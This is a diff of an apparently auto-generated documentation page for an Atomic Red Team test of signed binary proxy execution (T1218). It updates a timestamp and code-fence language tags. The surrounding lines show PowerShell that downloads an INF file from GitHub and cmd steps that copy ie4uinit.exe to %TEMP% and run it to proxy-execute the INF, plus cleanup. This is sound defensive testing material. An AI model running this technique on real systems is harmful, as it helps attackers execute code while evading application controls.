@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218"
 attack_technique_name: "Signed Binary Proxy Execution"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "13c0804e-615e-43ad-b223-2dfbacd0b0b3"
@@ -59,13 +59,13 @@ ieuinit.inf must exist on disk at specified location (#{Path_inf})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{Path_inf}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{Path_inf}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf" -OutFile "#{Path_inf}"
 ```
@@ -76,7 +76,7 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 copy #{Path_ie4uinit} %TEMP%\ie4uinit.exe
 copy "#{Path_inf}" %TEMP%\ieuinit.inf
 %TEMP%\ie4uinit.exe -BaseSettings
@@ -84,7 +84,7 @@ copy "#{Path_inf}" %TEMP%\ieuinit.inf
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del %TEMP%\ie4uinit.exe >nul 2>&1
 del %TEMP%\ieuinit.inf >nul 2>&1
 ```
